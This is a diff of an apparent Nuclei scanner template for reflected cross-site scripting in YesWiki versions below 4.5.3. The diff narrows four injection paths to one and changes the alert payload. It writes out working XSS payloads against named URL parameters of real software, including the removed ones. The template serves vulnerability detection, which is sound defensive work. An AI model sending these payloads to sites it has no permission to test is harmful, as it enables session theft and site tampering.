@@ -1,41 +1,36 @@
 id: yeswiki-reflected-xss
 
 info:
-  name: YesWiki Multiple Reflected XSS
+  name: YesWiki - Cross-Site Scripting
   author: MuhammadWaseem
   severity: high
   description: |
-    YesWiki versions < 4.5.3 are vulnerable to multiple reflected cross-site
-    scripting (XSS) vulnerabilities in both authenticated and unauthenticated
-    portions of the application. Parameters such as `incomingurl`, `id`, `file`,
-    `tags`, and `template` are not properly sanitized, allowing arbitrary
-    JavaScript execution.
-  remediation: Upgrade to YesWiki version 4.6.0 or later.
+    YesWiki versions < 4.5.3 are vulnerable to multiple reflected cross-site scripting (XSS) vulnerabilities, allowing arbitrary JavaScript execution.
+  impact:
+    Attackers can steal cookies, hijack user sessions, deface websites, or embed malicious content.
+  remediation: |
+    Upgrade to YesWiki version 4.6.0 or later.
   reference:
     - https://github.com/YesWiki/yeswiki/security/advisories/GHSA-5724-x3rh-5qqq
-  classification:
-    cvss-score: 8.8
-    cve-id: 
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: "yeswiki"
   tags: xss,yeswiki,cms,reflected
 
 http:
   - method: GET
     path:
-      - "{{BaseURL}}/?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
-      - "{{BaseURL}}/?BazaR/bazariframe&id=2&template=%3Cscript%3Ealert(1)%3C/script%3E&width=100%25&height=600px"
-      - "{{BaseURL}}/?BazaR&vue=saisir&action=saisir_fiche&id=%3Cscript%3Ealert(1)%3C%2fscript%3E"
-      - "{{BaseURL}}/?GererThemes/upload&file=%3Cscript%3Ealert(1)%3C/script%3E"
+      - "{{BaseURL}}/?PagePrincipale/listpages&tags=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
 
-    stop-at-first-match: true
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - "<script>alert(1)</script>"
-          - "<script>alert(1)<\\/script>"
-        condition: or
-        case-insensitive: true
+          - "<script>alert(document.domain)</script>"
+          - "yeswiki-base"
+        condition: and
 
       - type: word
         part: content_type
